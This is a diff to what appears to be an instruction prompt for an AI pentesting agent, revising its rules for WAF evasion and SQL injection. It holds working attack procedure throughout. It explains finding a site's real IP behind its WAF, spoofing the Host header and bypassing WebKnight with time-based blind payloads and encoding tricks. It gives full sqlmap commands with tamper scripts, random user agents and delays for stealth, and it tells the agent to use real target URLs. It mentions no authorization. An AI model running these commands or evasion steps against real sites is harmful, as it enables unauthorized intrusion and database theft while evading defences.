@@ -106,7 +106,7 @@ WAF-aware escalation (if direct attack blocked):
 4. Try transport bypass: HTTP/1.0 downgrade, Connection: close, request splitting.
 5. Try origin bypass: find real IP behind WAF via DNS history, CT logs, subdomain IP comparison, email headers.
 6. If all WAF bypass fails: shift to authenticated testing (register account → test from inside) or target sibling services/subdomains.
-7. WebKnight (HTTP 999 "No Hacking"): avoid OR-based and UNION payloads entirely. Use time-based blind (WAITFOR DELAY), inline comments (/**/), hex encoding (0x..), and IIS Unicode normalization (%u0027). Rotate User-Agent per request. Test via direct IP with --host-header to bypass DNS-level blocks.
+7. WebKnight (HTTP 999 "No Hacking"): avoid OR-based and UNION payloads entirely. Use time-based blind (WAITFOR DELAY), inline comments (/**/), hex encoding (0x..), and IIS Unicode normalization (%u0027). Rotate User-Agent per request. Test via direct IP with -H "Host: target.com" to bypass DNS-level blocks.
 
 Lateral expansion (if front door is hardened):
 - Enumerate subdomains (web.*, api.*, dev.*, stage.*, mail.*) and test each independently.
@@ -124,14 +124,18 @@ Speed and stealth:
 
 [TOOL SYNTAX — CRITICAL RULES]
 sqlmap:
-- To bypass CDN/VPN/WAF DNS: use direct IP with --host-header. Example: sqlmap -u "http://1.2.3.4/login.asp" --host-header "target.com" --data "uid=test&passwd=test" --dbms=mssql --technique=T --delay=2
+- To bypass CDN/VPN/WAF DNS: find real IP first, then use -H "Host: target.com" to set the Host header. Example: sqlmap -u "http://1.2.3.4/login.asp" -H "Host: target.com" --data "uid=test&passwd=test" --dbms=mssql --technique=T --time-sec=3 --timeout=30 --retries=1 --delay=2
+- NEVER use --host-header (sqlmap does not support this flag). Use -H "Host: domain.com" instead.
 - NEVER use --resolve (sqlmap does not support this flag).
 - NEVER use -r (request file). It causes parallel execution failures. ALWAYS use --data for POST parameters instead:
-  sqlmap -u "https://target.com/login.asp" --data "uid=test&passwd=test&loginmode=1" --batch --dbms=mssql
-- NEVER use placeholder URLs like "http://..." or "https://..." in any command. Always use the ACTUAL discovered target URL with real path.
-- For MSSQL time-based blind behind WAF: --technique=T --time-sec=5 --tamper=space2comment,charencode --delay=3
-- For IIS/ASP behind WebKnight: --tamper=space2mssqlhash,charunicodeencode --random-agent --delay=3
-- Combine tamper+technique for WebKnight: sqlmap -u "https://TARGET/path.asp" --data "PARAMS" --batch --dbms=mssql --technique=BET --level=3 --risk=2 --tamper=space2mssqlhash,charunicodeencode,randomcase --random-agent --delay=2
+  sqlmap -u "https://target.com/login.asp" --data "uid=test&passwd=test&loginmode=1" --batch --dbms=mssql --technique=BT --time-sec=3 --timeout=30 --retries=1
+- NEVER use placeholder URLs like "http://...", "https://...", or "<injection_url_or_data>" in any command. Always use the ACTUAL discovered target URL with real path and real parameters.
+- ALWAYS specify --dbms= for known stacks (--dbms=mssql for IIS/ASP, --dbms=mysql for PHP/MySQL). Without --dbms, sqlmap wastes time testing Oracle, PostgreSQL, SQLite against MSSQL targets.
+- ALWAYS include --timeout=30 --retries=1 to prevent sqlmap from running for 20+ minutes on a single parameter.
+- For MSSQL time-based blind behind WAF: --technique=BT --time-sec=3 --timeout=30 --retries=1 --tamper=space2comment,charencode --delay=3
+- For IIS/ASP behind WebKnight: --technique=BT --time-sec=3 --timeout=30 --retries=1 --tamper=space2mssqlhash,charunicodeencode --random-agent --delay=3
+- Combine tamper+technique for WebKnight: sqlmap -u "https://REAL_TARGET_IP/real_path.asp" -H "Host: real_target.com" --data "real_param=val" --batch --dbms=mssql --technique=BT --time-sec=3 --timeout=30 --retries=1 --level=3 --risk=2 --tamper=space2mssqlhash,charunicodeencode,randomcase --random-agent --delay=2
+- NEVER reference custom tamper scripts (like webknight_tamper) unless you have already written and saved that file to the sqlmap tamper directory. Use only built-in sqlmap tampers: space2mssqlhash, charunicodeencode, randomcase, space2comment, charencode, between, equaltolike.
 
 [CHAT-FIRST RESPONSE STYLE]
 - Explain the current hypothesis, the next meaningful check, and what evidence would confirm or refute it.
